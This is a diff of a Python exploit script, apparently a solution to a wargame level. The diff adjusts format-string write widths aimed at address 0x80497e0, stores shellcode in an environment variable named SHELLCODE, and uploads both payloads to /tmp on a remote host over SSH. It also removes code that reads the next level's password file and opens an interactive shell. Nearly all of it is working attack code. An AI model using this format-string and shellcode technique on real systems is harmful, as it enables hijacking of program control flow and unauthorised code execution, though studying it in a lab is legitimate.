@@ -68,8 +68,8 @@ def exploit():
 
     
     payload_arg = p32(0x80497e0) + p32(0x80497e0 + 2) \
-    + b"%55165d" + b"%10$hn" \
-    + b"%10362d" + b"%11$hn"
+    + b"%55408d" + b"%10$hn" \
+    + b"%10119d" + b"%11$hn"
     
     print(payload_arg)
 
@@ -78,7 +78,7 @@ def exploit():
 
     conn = get_connection(
         custom_env={
-            "LC_PAPER": paylod_env
+            "SHELLCODE": paylod_env
         }
     )
 
@@ -95,26 +95,8 @@ def exploit():
     if not LOCAL and SSH_SESSION is not None:
         SSH_SESSION.upload_data(payload_arg, "/tmp/payload")
         SSH_SESSION.upload_data(paylod_env, "/tmp/shellcode")
-        print("Payloads uploaded to /tmp/payload on remote server.")
+        print("Payloads uploaded to /tmp/payload and /tmp/shellcode on remote server.")
 
-
-    try:
-        if not LOCAL:
-            conn.recvuntil(b'$')
-            conn.sendline(b'cat /home/users/level06/.pass')
-            flag = conn.recvline()
-            print("\n=== Flag ===")
-            print(flag.decode())
-        conn.interactive()
-    
-    except EOFError:
-        print("EOFError")
-        pass
-    except Exception as e:
-        print(e)
-        pass
-    finally:
-        conn.close()
 
    
 if __name__ == "__main__":
